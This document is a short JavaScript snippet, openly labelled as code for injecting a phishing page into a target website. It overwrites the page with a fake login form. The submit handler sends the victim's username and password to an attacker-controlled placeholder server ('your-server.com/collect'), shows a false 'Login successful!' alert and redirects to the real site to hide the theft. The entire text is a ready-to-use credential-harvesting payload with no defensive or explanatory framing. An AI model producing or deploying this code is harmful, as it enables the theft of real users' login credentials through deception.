// Inject the phishing page into the target website
document.body.innerHTML = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Page</title>
        <style>
            body { font-family: Arial, sans-serif; }
            .container { width: 300px; margin: 0 auto; }
            input, button { width: 100%; padding: 10px; margin: 5px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>Welcome to [Target Website]</h2>
            <form id="phishingForm">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <script>
                document.getElementById('phishingForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    const username = document.querySelector('input[name="username"]').value;
                    const password = document.querySelector('input[name="password"]').value;
                    fetch('http://your-server.com/collect', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ username, password })
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert('Login successful!');
                        window.location.href = 'http://original-website.com';
                    })
                    .catch(error => console.error('Error:', error));
                });
            </script>
        </div>
    </body>
    </html>
`;